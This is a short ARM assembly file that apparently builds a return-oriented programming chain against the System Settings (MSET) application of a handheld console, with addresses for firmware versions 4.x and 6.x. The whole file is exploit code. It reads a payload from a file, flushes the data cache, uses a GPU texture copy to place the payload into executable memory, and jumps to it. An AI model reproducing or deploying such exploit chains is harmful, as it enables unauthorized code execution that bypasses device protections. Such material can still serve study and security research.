	.arm
	.text

#include "rop.h"

#undef THIS
#if defined(MSET_4X) || defined(MSET_4X_DG)
	#define THIS 0x00279000
#elif defined(MSET_6X)
	#define THIS 0x00287000
#endif

#ifndef MSET_ARM_CODE_SIZE
	#define MSET_ARM_CODE_SIZE 0x00004000
#endif

	.global	_start
@---------------------------------------------------------------------------------
_start:
	rop_store(THIS+4, ARM_CODE_OFFSET)
	rop_file_read(THIS, THIS+0x20, BUFFER_LOC, MSET_ARM_CODE_SIZE)
	rop_flush_data_cache(BUFFER_LOC, MSET_ARM_CODE_SIZE)
	rop_gx_texture_copy(BUFFER_LOC, CODE_TARGET, MSET_ARM_CODE_SIZE)
	rop_sleep(1000000000)
	rop_jump_arm
